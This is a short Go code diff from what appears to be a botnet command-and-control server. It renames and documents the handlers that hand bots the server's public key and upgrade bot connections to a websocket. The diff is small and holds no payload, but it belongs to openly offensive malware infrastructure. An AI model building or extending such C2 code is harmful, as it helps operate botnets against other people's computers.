@@ -17,19 +17,20 @@ func NewCCService() *mux.Router {
 	if err != nil {
 		log.Fatalf("could not create new command and control: %s", err)
 	}
-	go cc.Start()
+	go cc.StartBotnet()
 
 	router := mux.NewRouter()
 
 	// exposes a public key for bots to encrypt commands before sending
-	router.Methods(http.MethodGet).Path(protocol.KeyEndpoint).HandlerFunc(cc.keyHandler)
+	router.Methods(http.MethodGet).Path(protocol.KeyEndpoint).HandlerFunc(cc.KeyHTTPHandler)
 	// accepts new bots and handles all communication to bots
-	router.Methods(http.MethodGet).Path(protocol.CCEndpoint).HandlerFunc(cc.commandAndControlHandler)
+	router.Methods(http.MethodGet).Path(protocol.CCEndpoint).HandlerFunc(cc.CommandAndControlHTTPHandler)
 
 	return router
 }
 
-func (cc *CommandAndControl) keyHandler(w http.ResponseWriter, r *http.Request) {
+// KeyHTTPHandler serves the CC server's public key
+func (cc *CommandAndControl) KeyHTTPHandler(w http.ResponseWriter, r *http.Request) {
 	ccDiscoveryBytes, err := json.Marshal(&protocol.CCDiscovery{Key: cc.ServerKey})
 	if err != nil {
 		w.WriteHeader(http.StatusInternalServerError)
@@ -41,7 +42,8 @@ func (cc *CommandAndControl) keyHandler(w http.ResponseWriter, r *http.Request) 
 	return
 }
 
-func (cc *CommandAndControl) commandAndControlHandler(w http.ResponseWriter, r *http.Request) {
+// CommandAndControlHTTPHandler serves the HTTP entrypoint to the botnet websocket
+func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter, r *http.Request) {
 	// upgrade protocol to websockets connection
 	upgrader := websocket.Upgrader{ReadBufferSize: 1024, WriteBufferSize: 1024}
 	conn, err := upgrader.Upgrade(w, r, nil)
